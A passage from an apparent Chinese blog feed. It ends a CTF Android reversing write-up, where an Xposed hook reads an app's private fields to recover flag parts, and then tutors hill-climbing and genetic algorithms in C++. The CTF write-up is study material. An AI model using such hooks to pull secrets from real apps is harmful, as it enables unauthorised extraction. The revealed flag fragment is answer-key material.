class="meta">@Override</span></span><br><span class="line">					<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">						Class clazz = param.thisObject.getClass();</span><br><span class="line">						XposedBridge.log(<span class="string">"LoadClass : "</span>+clazz.getName());</span><br><span class="line">						Field[] fields = clazz.getDeclaredFields();</span><br><span class="line">						<span class="keyword">for</span>(<span class="keyword">int</span> f=<span class="number">0</span>;f &lt; fields.length;f++)&#123;</span><br><span class="line">						       fields[f].setAccessible(<span class="keyword">true</span>);</span><br><span class="line">						       XposedBridge.log( fields[f].getName());</span><br><span class="line">						       <span class="keyword">if</span>(fields[f].getName().equals(<span class="string">"srand1"</span>) || fields[f].getName().equals(<span class="string">"srand2"</span>))&#123;</span><br><span class="line">						    	   Long password = (Long) fields[f].get(param.thisObject);</span><br><span class="line">						    	   XposedBridge.log(String.valueOf(password));</span><br><span class="line">						       &#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里需要注意的是，这个srand是private的，所以我们需要<code>setAccessible</code>进行处理一下。<br>最终可以在日志中看到：<br><img src="3.jpg" alt="srand"><br>将这两个值重新放入到我们的脚本中最终可以得到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_</span><br><span class="line">_c</span><br><span class="line">_ch</span><br><span class="line">_che</span><br><span class="line">_chec</span><br><span class="line">_check</span><br><span class="line">_check1</span><br><span class="line">_check1n</span><br><span class="line">_check1n_</span><br><span class="line">_check1n_w</span><br><span class="line">_check1n_we</span><br><span class="line">_check1n_wel</span><br><span class="line">_check1n_welc</span><br><span class="line">_check1n_welc0</span><br><span class="line">_check1n_welc0m</span><br><span class="line">_check1n_welc0me</span><br><span class="line">_check1n_welc0me_</span><br><span class="line">_check1n_welc0me_t</span><br><span class="line">_check1n_welc0me_to</span><br><span class="line">_check1n_welc0me_to_</span><br><span class="line">_check1n_welc0me_to_M</span><br><span class="line">_check1n_welc0me_to_MR</span><br><span class="line">_check1n_welc0me_to_MRC</span><br><span class="line">_check1n_welc0me_to_MRCT</span><br><span class="line">_check1n_welc0me_to_MRCTF</span><br></pre></td></tr></table></figure>
<p>然后最终拼接到我们之前的flag中，最终的flag就出来了。</p>
<h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>真的是社会在进步了，思想有点落后了，还把自己高中时候的水平带到现在高中时候的水平，盲目狂妄自大只会让我一步步的掉入坑中，脚踏实地才是我们应该做的。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>群智能算法</title>
    <url>/2020/11/14/%E7%BE%A4%E6%99%BA%E8%83%BD%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在做人工智能的研究，总结下两个比较经典的最优解算法。</p>
<h2 id="爬山算法"><a href="#爬山算法" class="headerlink" title="爬山算法"></a>爬山算法</h2><p>有这个样子的题目：<br><img src="img1.jpg" alt="question"><br>x和y在-5到5的区间内找出最大的对于这个函数的解，函数有点乱，但是无非也就是一个二元的指数函数。</p>
<p>这种问题使用爬山算法算是比较快速解决的问题了，但是却有两个缺点。<br>先介绍一下爬山算法是什么东西（不用什么专业术语了）。</p>
<p>就比如说我们要爬山，我们在山脚下，我们可以选择往左右两个方向爬，但是我们并不知道哪个方向是往上爬，我们就需要计算一下两边的值，看看哪一个方向的位置大于我们当前的位置，我们就落脚到哪个位置，当我们发现左右两个方向的位置都比我们当前的位置要低的时候我们就认为我们已经爬到了山顶了。</p>
<p>看似比较合理，但是却有两个比较严重的缺陷：</p>
<ol>
<li>我们不知道一步能迈多大，有可能恰巧迈过了极高峰</li>
<li>我们不知道山有多少个山峰，有可能我们只是爬到了我们遇到的第一个山峰，导致我们的局限性（只能求出范围内极大值）</li>
</ol>
<p>画一张图：<br><img src="img2.jpg" alt="山"><br>可以看到如果按照这个算法，其实我们只是爬到了第一个山峰，真正最高的山峰，我们并不能爬到，并且第一个山峰比较尖，我们可能不小心迈过了。</p>
<p>这就是爬山算法的缺点，但是对于我们程序优化找出最适合程序的参数值的时候，却是非常合适的了。</p>
<p>算法的基本理论已经知道了，那么我们就可以进行编写之前题目中的那个复杂的指数函数了。</p>
<p>代码我用的还是CPP</p>
<p>首先我们需要一个判断山峰值的函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> num,...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	va_list arguments; </span><br><span class="line">	va_start( arguments, num ); </span><br><span class="line">	<span class="keyword">double</span> x = va_arg(arguments,<span class="keyword">double</span>);</span><br><span class="line">	<span class="keyword">double</span> y = va_arg(arguments,<span class="keyword">double</span>);</span><br><span class="line">	va_end ( arguments );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">double</span> z_one = -(y*y+x*x);</span><br><span class="line">	<span class="keyword">double</span> z_two = -(<span class="built_in">pow</span>((x<span class="number">-1.8</span>),<span class="number">2</span>)+<span class="built_in">pow</span>((y<span class="number">-1.8</span>),<span class="number">2</span>));</span><br><span class="line">	<span class="keyword">double</span> e = <span class="number">2.718</span>;<span class="comment">//这是e的近似值</span></span><br><span class="line">	<span class="keyword">double</span> ret = <span class="built_in">pow</span>(e,z_one)+<span class="number">2</span>*<span class="built_in">pow</span>(e,z_two);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我用的是cmatch头文件中的pow计算次方，并且将e的值约等于了2.718。</p>
<p>将这个函数用C++表说出来就是f(x)，为什么我要用不定个数的参数是因为，我想这样子可以增加程序的扩展性，方便我在之后解决程序上的最优参数问题给出更方便的库。</p>
<p>针对于这个问题我定义了一个结构体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BestSturct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">double</span> Bestvalue;</span><br><span class="line">	<span class="keyword">double</span> x;</span><br><span class="line">	<span class="keyword">double</span> y;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>最优的值，和最优的自变量x，y。</p>
<p>其实这是一个二元的三维函数图形，就是说我们爬山的时候需要张望前后左右四个位置。<br>我这里用到的是陡峭的爬山算法。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//陡峭的爬山算法</span></span><br><span class="line"><span class="function">BestSturct <span class="title">BestMatch</span><span class="params">(<span class="keyword">double</span> <span class="built_in">step</span>,callback thread,<span class="keyword">double</span> x[<span class="number">2</span>]<span class="comment">/*X坐标的开始结束*/</span>,<span class="keyword">double</span> startX,<span class="keyword">double</span> y[<span class="number">2</span>]<span class="comment">/*Y坐标的开始结束*/</span>,<span class="keyword">double</span> startY)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">double</span> currentX = startX;</span><br><span class="line">	<span class="keyword">double</span> currentY = startY;</span><br><span class="line">	<span class="keyword">double</span> currentValue = thread(<span class="number">2</span>,startX,startY);<span class="comment">//当前的值</span></span><br><span class="line">	<span class="keyword">while</span> (currentX &lt;= x[<span class="number">1</span>] &amp;&amp; currentY &lt;= y[<span class="number">1</span>] &amp;&amp; currentX &gt;= x[<span class="number">0</span>] &amp;&amp; currentY &gt;= y[<span class="number">0</span>])<span class="comment">//当我们在范围内的时候</span></span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">double</span> tmpcurrentX = currentX;</span><br><span class="line">		<span class="keyword">double</span> tmpcurrentY = currentY;</span><br><span class="line">		<span class="keyword">double</span> Max = currentValue;</span><br><span class="line">		<span class="keyword">bool</span> <span class="built_in">find</span> = <span class="literal">false</span>;<span class="comment">//判断是否发现了大的</span></span><br><span class="line">		<span class="comment">//1 X增加，Y增加</span></span><br><span class="line">		<span class="keyword">if</span> (currentX+<span class="built_in">step</span> &lt;= x[<span class="number">1</span>] &amp;&amp; currentY+<span class="built_in">step</span> &lt;= y[<span class="number">1</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			Max = thread(<span class="number">2</span>,currentX+<span class="built_in">step</span>,currentY+<span class="built_in">step</span>);</span><br><span class="line">			<span class="keyword">if</span> (Max &gt; currentValue)</span><br><span class="line">			&#123;</span><br><span class="line">				tmpcurrentX = currentX+<span class="built_in">step</span>;</span><br><span class="line">				tmpcurrentY = currentY+<span class="built_in">step</span>;</span><br><span class="line">				currentValue = Max;</span><br><span class="line">				<span class="built_in">find</span> = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//2 x增加，y减少</span></span><br><span class="line">		<span class="keyword">if</span> (currentX+<span class="built_in">step</span> &lt;= x[<span class="number">1</span>] &amp;&amp; currentY-<span class="built_in">step</span>&gt;=y[<span class="number">0</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			Max = thread(<span class="number">2</span>,currentX+<span class="built_in">step</span>,currentY-<span class="built_in">step</span>);</span><br><span class="line">			<span class="keyword">if</span> (Max &gt; currentValue)</span><br><span class="line">			&#123;</span><br><span class="line">				tmpcurrentX = currentX+<span class="built_in">step</span>;</span><br><span class="line">				tmpcurrentY = currentY-<span class="built_in">step</span>;</span><br><span class="line">				currentValue = Max;</span><br><span class="line">				<span class="built_in">find</span> = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//3 x减少，y减少</span></span><br><span class="line">		<span class="keyword">if</span> (currentX-<span class="built_in">step</span> &gt;= x[<span class="number">0</span>] &amp;&amp; currentY-<span class="built_in">step</span>&gt;=y[<span class="number">0</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			Max = thread(<span class="number">2</span>,currentX-<span class="built_in">step</span>,currentY-<span class="built_in">step</span>);</span><br><span class="line">			<span class="keyword">if</span> (Max &gt; currentValue)</span><br><span class="line">			&#123;</span><br><span class="line">				tmpcurrentX = currentX-<span class="built_in">step</span>;</span><br><span class="line">				tmpcurrentY = currentY-<span class="built_in">step</span>;</span><br><span class="line">				currentValue = Max;</span><br><span class="line">				<span class="built_in">find</span> = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//4 x减少，y增加</span></span><br><span class="line">		<span class="keyword">if</span> (currentX-<span class="built_in">step</span> &gt;= x[<span class="number">0</span>] &amp;&amp; currentY+<span class="built_in">step</span>&lt;=y[<span class="number">1</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			Max = thread(<span class="number">2</span>,currentX-<span class="built_in">step</span>,currentY+<span class="built_in">step</span>);</span><br><span class="line">			<span class="keyword">if</span> (Max &gt; currentValue)</span><br><span class="line">			&#123;</span><br><span class="line">				tmpcurrentX = currentX-<span class="built_in">step</span>;</span><br><span class="line">				tmpcurrentY = currentY+<span class="built_in">step</span>;</span><br><span class="line">				currentValue = Max;</span><br><span class="line">				<span class="built_in">find</span> = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//5  x减少，y不变</span></span><br><span class="line">		<span class="keyword">if</span> (currentX-<span class="built_in">step</span> &gt;= x[<span class="number">0</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			Max = thread(<span class="number">2</span>,currentX-<span class="built_in">step</span>,currentY);</span><br><span class="line">			<span class="keyword">if</span> (Max &gt; currentValue)</span><br><span class="line">			&#123;</span><br><span class="line">				tmpcurrentX = currentX-<span class="built_in">step</span>;</span><br><span class="line">				tmpcurrentY = currentY;</span><br><span class="line">				currentValue = Max;</span><br><span class="line">				<span class="built_in">find</span> = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//6  x增加，y不变</span></span><br><span class="line">		<span class="keyword">if</span> (currentX+<span class="built_in">step</span> &lt;= x[<span class="number">1</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			Max = thread(<span class="number">2</span>,currentX+<span class="built_in">step</span>,currentY);</span><br><span class="line">			<span class="keyword">if</span> (Max &gt; currentValue)</span><br><span class="line">			&#123;</span><br><span class="line">				tmpcurrentX = currentX+<span class="built_in">step</span>;</span><br><span class="line">				tmpcurrentY = currentY;</span><br><span class="line">				currentValue = Max;</span><br><span class="line">				<span class="built_in">find</span> = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//7  x不变，y增加</span></span><br><span class="line">		<span class="keyword">if</span> (currentY+<span class="built_in">step</span> &lt;= y[<span class="number">1</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			Max = thread(<span class="number">2</span>,currentX,currentY+<span class="built_in">step</span>);</span><br><span class="line">			<span class="keyword">if</span> (Max &gt; currentValue)</span><br><span class="line">			&#123;</span><br><span class="line">				tmpcurrentX = currentX;</span><br><span class="line">				tmpcurrentY = currentY+<span class="built_in">step</span>;</span><br><span class="line">				currentValue = Max;</span><br><span class="line">				<span class="built_in">find</span> = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//8  x不变，y减少</span></span><br><span class="line">		<span class="keyword">if</span> (currentY-<span class="built_in">step</span> &gt;= y[<span class="number">0</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			Max = thread(<span class="number">2</span>,currentX,currentY-<span class="built_in">step</span>);</span><br><span class="line">			<span class="keyword">if</span> (Max &gt; currentValue)</span><br><span class="line">			&#123;</span><br><span class="line">				tmpcurrentX = currentX;</span><br><span class="line">				tmpcurrentY = currentY-<span class="built_in">step</span>;</span><br><span class="line">				currentValue = Max;</span><br><span class="line">				<span class="built_in">find</span> = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		currentX = tmpcurrentX;</span><br><span class="line">		currentY = tmpcurrentY;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">find</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	BestSturct b;</span><br><span class="line">	b.Bestvalue = currentValue;</span><br><span class="line">	b.x = currentX;</span><br><span class="line">	b.y = currentY;</span><br><span class="line">	<span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先我们需要调用bestmatch这个函数的人传给我们关键的参数（bestmatch是假面骑士build中的，我觉得比较帅我就拿来做函数名了）：</p>
<ol>
<li>第一个参数是我们的步长，也就是每次在自变量x，y增加的值</li>
<li>第二个是我们的爬山函数<code>typedef double (*callback)(int ,...);</code>也就是我在上面的写的f(x)</li>
<li>下面的x和y的数组，第一个值是范围的最小值，第二个值是范围的最大值</li>
<li>还有个x，y是我们爬山的起始位置</li>
</ol>
<p>调用函数后进入while循环，循环的条件是我们当前的x和y满足范围就可以。然后我分为了8种情况，我在注释中进行了介绍。最终我们会找到一个情况就是，在当前的x，y上进行八种情况的运算已经没办法大于我们x，y本身的运算了，这个时候我们就要调出循环，返回最好的情况。</p>
<p>完整代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdarg&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BestSturct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">double</span> Bestvalue;</span><br><span class="line">	<span class="keyword">double</span> x;</span><br><span class="line">	<span class="keyword">double</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">double</span> <span class="params">(*callback)</span><span class="params">(<span class="keyword">int</span> ,...)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> num,...)</span></span>;<span class="comment">//第一个是参数个数</span></span><br><span class="line"><span class="function">BestSturct <span class="title">BestMatch</span><span class="params">(<span class="keyword">double</span> <span class="built_in">step</span>,callback thread,<span class="keyword">double</span> x[<span class="number">2</span>]<span class="comment">/*X坐标的开始结束*/</span>,<span class="keyword">double</span> startX,<span class="keyword">double</span> y[<span class="number">2</span>]<span class="comment">/*Y坐标的开始结束*/</span>,<span class="keyword">double</span> startY)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">double</span> x[<span class="number">2</span>] = &#123;<span class="number">-5</span>,<span class="number">5</span>&#125;;</span><br><span class="line">	<span class="keyword">double</span> y[<span class="number">2</span>] = &#123;<span class="number">-5</span>,<span class="number">5.1</span>&#125;;</span><br><span class="line">	<span class="keyword">double</span> <span class="built_in">step</span> = <span class="number">0.001</span>;</span><br><span class="line">	BestSturct best= BestMatch(<span class="built_in">step</span>,f,x,<span class="number">1</span>,y,<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"最好的值:%lf\n最好的x:%lf\n最好的y:%lf\n"</span>,best.Bestvalue,best.x,best.y);</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> num,...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	va_list arguments; </span><br><span class="line">	va_start( arguments, num ); </span><br><span class="line">	<span class="keyword">double</span> x = va_arg(arguments,<span class="keyword">double</span>);</span><br><span class="line">	<span class="keyword">double</span> y = va_arg(arguments,<span class="keyword">double</span>);</span><br><span class="line">	va_end ( arguments );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">double</span> z_one = -(y*y+x*x);</span><br><span class="line">	<span class="keyword">double</span> z_two = -(<span class="built_in">pow</span>((x<span class="number">-1.8</span>),<span class="number">2</span>)+<span class="built_in">pow</span>((y<span class="number">-1.8</span>),<span class="number">2</span>));</span><br><span class="line">	<span class="keyword">double</span> e = <span class="number">2.718</span>;<span class="comment">//这是e的近似值</span></span><br><span class="line">	<span class="keyword">double</span> ret = <span class="built_in">pow</span>(e,z_one)+<span class="number">2</span>*<span class="built_in">pow</span>(e,z_two);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//陡峭的爬山算法</span></span><br><span class="line"><span class="function">BestSturct <span class="title">BestMatch</span><span class="params">(<span class="keyword">double</span> <span class="built_in">step</span>,callback thread,<span class="keyword">double</span> x[<span class="number">2</span>]<span class="comment">/*X坐标的开始结束*/</span>,<span class="keyword">double</span> startX,<span class="keyword">double</span> y[<span class="number">2</span>]<span class="comment">/*Y坐标的开始结束*/</span>,<span class="keyword">double</span> startY)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">double</span> currentX = startX;</span><br><span class="line">	<span class="keyword">double</span> currentY = startY;</span><br><span class="line">	<span class="keyword">double</span> currentValue = thread(<span class="number">2</span>,startX,startY);<span class="comment">//当前的值</span></span><br><span class="line">	<span class="keyword">while</span> (currentX &lt;= x[<span class="number">1</span>] &amp;&amp; currentY &lt;= y[<span class="number">1</span>] &amp;&amp; currentX &gt;= x[<span class="number">0</span>] &amp;&amp; currentY &gt;= y[<span class="number">0</span>])<span class="comment">//当我们在范围内的时候</span></span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">double</span> tmpcurrentX = currentX;</span><br><span class="line">		<span class="keyword">double</span> tmpcurrentY = currentY;</span><br><span class="line">		<span class="keyword">double</span> Max = currentValue;</span><br><span class="line">		<span class="keyword">bool</span> <span class="built_in">find</span> = <span class="literal">false</span>;<span class="comment">//判断是否发现了大的</span></span><br><span class="line">		<span class="comment">//1 X增加，Y增加</span></span><br><span class="line">		<span class="keyword">if</span> (currentX+<span class="built_in">step</span> &lt;= x[<span class="number">1</span>] &amp;&amp; currentY+<span class="built_in">step</span> &lt;= y[<span class="number">1</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			Max = thread(<span class="number">2</span>,currentX+<span class="built_in">step</span>,currentY+<span class="built_in">step</span>);</span><br><span class="line">			<span class="keyword">if</span> (Max &gt; currentValue)</span><br><span class="line">			&#123;</span><br><span class="line">				tmpcurrentX = currentX+<span class="built_in">step</span>;</span><br><span class="line">				tmpcurrentY = currentY+<span class="built_in">step</span>;</span><br><span class="line">				currentValue = Max;</span><br><span class="line">				<span class="built_in">find</span> = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//2 x增加，y减少</span></span><br><span class="line">		<span class="keyword">if</span> (currentX+<span class="built_in">step</span> &lt;= x[<span class="number">1</span>] &amp;&amp; currentY-<span class="built_in">step</span>&gt;=y[<span class="number">0</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			Max = thread(<span class="number">2</span>,currentX+<span class="built_in">step</span>,currentY-<span class="built_in">step</span>);</span><br><span class="line">			<span class="keyword">if</span> (Max &gt; currentValue)</span><br><span class="line">			&#123;</span><br><span class="line">				tmpcurrentX = currentX+<span class="built_in">step</span>;</span><br><span class="line">				tmpcurrentY = currentY-<span class="built_in">step</span>;</span><br><span class="line">				currentValue = Max;</span><br><span class="line">				<span class="built_in">find</span> = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//3 x减少，y减少</span></span><br><span class="line">		<span class="keyword">if</span> (currentX-<span class="built_in">step</span> &gt;= x[<span class="number">0</span>] &amp;&amp; currentY-<span class="built_in">step</span>&gt;=y[<span class="number">0</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			Max = thread(<span class="number">2</span>,currentX-<span class="built_in">step</span>,currentY-<span class="built_in">step</span>);</span><br><span class="line">			<span class="keyword">if</span> (Max &gt; currentValue)</span><br><span class="line">			&#123;</span><br><span class="line">				tmpcurrentX = currentX-<span class="built_in">step</span>;</span><br><span class="line">				tmpcurrentY = currentY-<span class="built_in">step</span>;</span><br><span class="line">				currentValue = Max;</span><br><span class="line">				<span class="built_in">find</span> = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//4 x减少，y增加</span></span><br><span class="line">		<span class="keyword">if</span> (currentX-<span class="built_in">step</span> &gt;= x[<span class="number">0</span>] &amp;&amp; currentY+<span class="built_in">step</span>&lt;=y[<span class="number">1</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			Max = thread(<span class="number">2</span>,currentX-<span class="built_in">step</span>,currentY+<span class="built_in">step</span>);</span><br><span class="line">			<span class="keyword">if</span> (Max &gt; currentValue)</span><br><span class="line">			&#123;</span><br><span class="line">				tmpcurrentX = currentX-<span class="built_in">step</span>;</span><br><span class="line">				tmpcurrentY = currentY+<span class="built_in">step</span>;</span><br><span class="line">				currentValue = Max;</span><br><span class="line">				<span class="built_in">find</span> = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//5  x减少，y不变</span></span><br><span class="line">		<span class="keyword">if</span> (currentX-<span class="built_in">step</span> &gt;= x[<span class="number">0</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			Max = thread(<span class="number">2</span>,currentX-<span class="built_in">step</span>,currentY);</span><br><span class="line">			<span class="keyword">if</span> (Max &gt; currentValue)</span><br><span class="line">			&#123;</span><br><span class="line">				tmpcurrentX = currentX-<span class="built_in">step</span>;</span><br><span class="line">				tmpcurrentY = currentY;</span><br><span class="line">				currentValue = Max;</span><br><span class="line">				<span class="built_in">find</span> = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//6  x增加，y不变</span></span><br><span class="line">		<span class="keyword">if</span> (currentX+<span class="built_in">step</span> &lt;= x[<span class="number">1</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			Max = thread(<span class="number">2</span>,currentX+<span class="built_in">step</span>,currentY);</span><br><span class="line">			<span class="keyword">if</span> (Max &gt; currentValue)</span><br><span class="line">			&#123;</span><br><span class="line">				tmpcurrentX = currentX+<span class="built_in">step</span>;</span><br><span class="line">				tmpcurrentY = currentY;</span><br><span class="line">				currentValue = Max;</span><br><span class="line">				<span class="built_in">find</span> = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//7  x不变，y增加</span></span><br><span class="line">		<span class="keyword">if</span> (currentY+<span class="built_in">step</span> &lt;= y[<span class="number">1</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			Max = thread(<span class="number">2</span>,currentX,currentY+<span class="built_in">step</span>);</span><br><span class="line">			<span class="keyword">if</span> (Max &gt; currentValue)</span><br><span class="line">			&#123;</span><br><span class="line">				tmpcurrentX = currentX;</span><br><span class="line">				tmpcurrentY = currentY+<span class="built_in">step</span>;</span><br><span class="line">				currentValue = Max;</span><br><span class="line">				<span class="built_in">find</span> = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//8  x不变，y减少</span></span><br><span class="line">		<span class="keyword">if</span> (currentY-<span class="built_in">step</span> &gt;= y[<span class="number">0</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			Max = thread(<span class="number">2</span>,currentX,currentY-<span class="built_in">step</span>);</span><br><span class="line">			<span class="keyword">if</span> (Max &gt; currentValue)</span><br><span class="line">			&#123;</span><br><span class="line">				tmpcurrentX = currentX;</span><br><span class="line">				tmpcurrentY = currentY-<span class="built_in">step</span>;</span><br><span class="line">				currentValue = Max;</span><br><span class="line">				<span class="built_in">find</span> = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		currentX = tmpcurrentX;</span><br><span class="line">		currentY = tmpcurrentY;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">find</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	BestSturct b;</span><br><span class="line">	b.Bestvalue = currentValue;</span><br><span class="line">	b.x = currentX;</span><br><span class="line">	b.y = currentY;</span><br><span class="line">	<span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实之后我们还享用到二维的爬山算法，我们只需要更改f函数来就可以算出范围内最优解了，看下程序运行后的结果：<br><img src="img3.jpg" alt="res"><br>我设置的步长为0.001，算是比较精确了。</p>
<h2 id="遗传算法"><a href="#遗传算法" class="headerlink" title="遗传算法"></a>遗传算法</h2><p>这也是我认为比较有趣的算法，他是模拟了达尔文进化论的一个算法，物竞天择，适者生存的道理，解决了爬山算法的局限性和步长问题。</p>
<p>比如说长颈鹿，原本可能在很久之前并不是这么长的脖子，但是随着时代的发展，淘汰掉了不适合的短脖子长颈鹿，长脖子的长颈鹿就活了下来，那么他是一个什么过程呢？<br>第一代长颈鹿可能不是很长的脖子，但是通过大自然的选择之后，相对比较长的长颈鹿就活了下来，他们进行了交配，在交配的过程中发生了染色体的交换以及染色体的变异，可能会诞生脖子更加长的长颈鹿，然后更加长的再进行选择，又进行交配，最终我们看到的长颈鹿脖普遍都是比较长的。</p>
<p>那么这和我们的最优解有什么关系呢？</p>
<p>我们和爬山算法一样，我们还是需要有一个要解决的函数问题，这里我就简单的写一个函数f(x1,x2)=x1^2+x2^2</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x1, <span class="keyword">int</span> x2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x1*x1+x2*x2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数我称他为环境函数，他就有点类似于大自然对长颈鹿脖子长更有活下来可能的函数，因为x1和x2越大返回的值越大，也越适合。<br>然后我们还需要第一代个体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="built_in">size</span> = <span class="number">8</span>;<span class="comment">//总共可以选择的个体数</span></span><br><span class="line"><span class="keyword">int</span> allnum = factorial(<span class="built_in">size</span>);<span class="comment">//两两配对最大个数</span></span><br><span class="line"><span class="keyword">int</span> ALLindividual[<span class="number">8</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>&#125;;</span><br></pre></td></tr></table></figure>
<p>factorial函数是一个阶乘的递归函数</p>
